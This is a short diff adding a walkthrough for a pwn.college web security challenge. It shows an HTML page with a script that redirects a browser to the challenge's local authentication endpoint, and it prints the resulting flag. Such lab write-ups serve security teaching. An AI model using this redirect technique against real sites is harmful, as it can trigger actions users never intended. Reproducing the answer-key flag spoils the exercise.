@@ -1,0 +1,20 @@
+Start the challenge and read the code. cat /challenge/server
+Start Terminal1 or Tab1 and start the server: /challenge/server
+Start Terminal2 or Tab2 and write the following HTML file.
+
+mkdir -p /home/hacker/public_html
+cat > /home/hacker/public_html/solve.html << 'EOF'
+<html>
+  <body>
+    <script>
+      window.location = "http://challenge.localhost/authenticate";
+    </script>
+  </body>
+</html>
+EOF
+
+Save the file.
+Open the 2nd tab and type /challenge/server and press Enter to run the server.
+Open the 1st tab and type /challenge/client and press Enter.
+Now the server will capture the requests and the flag will show at the client tab.
+The flag is: pwn.college{MTbz7CE8T0PFQ0_4jGHLxhxsWre.QX1EDM1EDL5MjM1QzW}
